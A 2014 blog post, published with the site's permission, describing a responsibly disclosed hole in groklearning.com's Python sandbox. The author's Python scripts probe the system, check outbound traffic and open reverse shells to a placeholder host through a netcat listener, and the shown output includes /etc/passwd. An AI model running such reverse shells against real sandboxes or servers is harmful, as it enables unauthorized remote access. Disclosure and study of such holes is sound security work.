---
layout: post
title: How I managed to get shell access to groklearning.com
created: 1394030749
tags: python programming
---
groklearning.com provides a platform for online education where one
can learn how to program in Python.

It is one of these projects that make the world better by providing
online & free education to people. If you are new to programming and
want to learn some Python, I'd suggest you visit
[groklearning.com](http://groklearning.com) site and take some (why
not all) of the courses they have!

I've been using groklearning.com myself and have been telling friends
about it who wish to learn Python, but don't know where to start from.

Using groklearning.com you can write your Python script, which in turn
is executed and result is displayed back to the user. This is very
cool, because you don't have to bring Python with you all the time and
simply use it from your browser, but this also comes with a risk...

What if someone manages to make the system serve a different
purpose..? What if someone manages to turn this into a weapon..?

In this post we are going to explore the security of groklearning.com
by trying to get shell access to the systems.

*DISCLAIMER: The information provided here is for educational purposes
 only! Any unauthorized attempts to use this information for malicious
 acts may be disclosed to law enforcement authorities and result in
 criminal prosecution!*

This post was published with the permission and agreement of the
[Security Team at
groklearning.com](https://groklearning.com/security/).

## Choosing our target

First thing I did is to choose a target. I've chosen the [Eliza
course](https://groklearning.com/csedweek/hoc-eliza/) and continued
from there.

NOTE: Any other course would also work as long as it provides you with
a window where you could write your Python script.

## Checking active processes

The first Python script I've ran was to get a list of all active
processes on the system. This would later allow me to identify any
weak spots that I could use for my attack.

This is the script I've used:

```python
import subprocess

p = subprocess.Popen(['/bin/ps', '-ef'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

print(p.stdout.read())
print(p.stderr.read())
```

From the output of the above script I was able to identify a number of
things about the system, such as OS, Virtualization technology being
used, etc..

## Having a look around

It was time to have a look around and see what we've got on this
system. I've started checking what's in `/bin`, `/usr/bin`, and other
directories in order to identify anything that could be used as a
weapon.

The system running my Python script was stripped down a bit, so you
won't find all the UNIX/Linux tools you usually find on a default
installation of a GNU/Linux system for example.

I've used this script to get what's in the different directories.

```python
import subprocess

p = subprocess.Popen(['/bin/ls', '-la', '/bin'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

print(p.stdout.read())
print(p.stderr.read())
```

Okay, first thing noticed was that `/bin/bash` was there... Thought
I'd give it try and see if I could start it...

I've quickly loaded my next Python script and executed it:

```python
import subprocess

p = subprocess.Popen(['/bin/bash', '--version'], stdout=subprocess.PIPE)

print(p.stdout.read())
```

I wasn't really hoping much for anything to happen, but then I got
result back which was:

```bash
GNU bash, version 4.2.37(1)-release (i686-pc-linux-gnu)
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

Okay, now I knew I could start a shell on the remote system, but I
couldn't do much with it... at least for now...

## Is outbound traffic allowed?

Time to check if outbound traffic is allowed. If outbound traffic was
allowed I could write up a Python script which would spawn a reverse
shell for me and grant me access.. Only if outbound traffic is
allowed..

So, I've used this script to verify that outbound HTTP traffic is
allowed.

```python
import socket
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
s.connect(("www.python.org" , 80))
s.sendall(b"GET http://www.python.org HTTP/1.0\n\n")
print(s.recv(4096))
s.close()
```

I've loaded this script in *Eliza* and hit the *run* button. And the
result was:

```html
HTTP/1.1 404 Not found
Server: Varnish
Retry-After: 0
content-type: text/html
Content-Length: 77
Accept-Ranges: bytes
Date: Tue, 04 Mar 2014 18:13:57 GMT
Via: 1.1 varnish
Connection: close


<html>
<head>
<title> </title>
</head>
<body>
unknown domain: </body></html>
```

The result from the script confirmed that outbound HTTP traffic is
allowed, so I was ready to launch my first attack.

## Launching the attack

I've created a listener on my machine on port 80 using netcat which I
would later use for my reverse shell:

```bash
$ sudo nc -l -p 80
```

Next thing I had to do is load a reverse shell script in Python to
groklearning.com. This the script I've used for my Python reserve
shell:

```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('x.x.x.x', 80))

s.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)

p = subprocess.call(['/bin/sh', '-i'])
```

As soon as I fired up the Python reverse shell I was able to see the
shell prompt on my netcat listener.

Then I tried executing some shell commands:

```bash
$ ls
/bin/sh: 1: Cannot fork
$ pwd
/tmp/tmphBjnv5
$ cat /etc/passwd
/bin/sh: 3: Cannot fork
$ uname -a
/bin/sh: 4: Cannot fork
$ ^D
```

Unfortunately, I wasn't able to do much with my reverse shell, as it
seems there were some limits in place, so I went further into checking
things on the target machine.

## Checking our limits

Next thing I did is to check the limits on the target system. I've
used the following Python script to check our limits:

```python
import subprocess

p = subprocess.Popen(['/bin/bash', '-c', 'ulimit -a'], stdout=subprocess.PIPE)

print(p.stdout.read())
```

The result I got was this:

```text
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 13371
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) 3
max user processes              (-u) 3
virtual memory          (kbytes, -v) 102400
file locks                      (-x) unlimited
```

As you could see from the above output we were limited to just 3 users
processes... Apparently, I wasn't going to get my shell so easily so I
had to think up something else...

## Launching the second attack

It was time to launch a second attack, but this time using
`os.execv()` instead of `subprocess.call()`

So, I've started my netcat listener again, and then used this script
for my reverse shell:

```python
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('x.x.x.x', 80))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)

os.execv('/bin/sh', ['-i'])
```

The result this time was this:

```bash
$ sudo nc -l 80 

pwd
/tmp/tmpEMZgWN

ls -la 
total 4
drwx------ 3 39540956 1002    0 Mar  4 18:22 .
drwx--x--x 4     1001 root 4096 Mar  4 18:22 ..
-rw------- 1 39540956 1002  263 Mar  4 18:22 program.py

uname -a 
Linux prod-terminal00-eu-west-1 3.8.0-35-generic #50-Ubuntu SMP Tue Dec 3 01:24:59 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh

cat /etc/issue
Ubuntu 12.10 \n \l

whereis vi 
vi:

cat > hello.txt <<__EOF__
Hi, there!
__EOF__

cat hello.txt
Hi, there!

ls -la
total 4
drwx------ 4 39540956 1002    0 Mar  4 18:22 .
drwx--x--x 4     1001 root 4096 Mar  4 18:23 ..
-rw------- 1 39540956 1002   11 Mar  4 18:23 hello.txt
-rw------- 1 39540956 1002  263 Mar  4 18:22 program.py

cat program.py
# Enter your code for "Interacting with Eliza" here.


import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('x.x.x.x', 80))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)

os.execv('/bin/sh', ['-i'])
```

This time I managed to get my reserve shell and get access to the
system running the groklearning.com Python code.

At this point I stopped and decided it was time to let the Security
Team at groklearning.com know about the security issue.

## Fixing the issue

Soon after I managed to get shell access to the system I mailed the
Security Team at groklearning.com about this issue.

After sending the mail soon enough one of the guys from Security Team
at groklearning.com contacted me and we had a conversation about the
issue in order to further identify the root cause. A bit later the
security issue was fixed and creating a reverse shell was no longer
possible.

Now, we can all be a bit happier that
[groklearning.com](https://groklearning.com/) is a bit safer than
before with patching that security issue and continues to serve it's
mission to educate people! :)
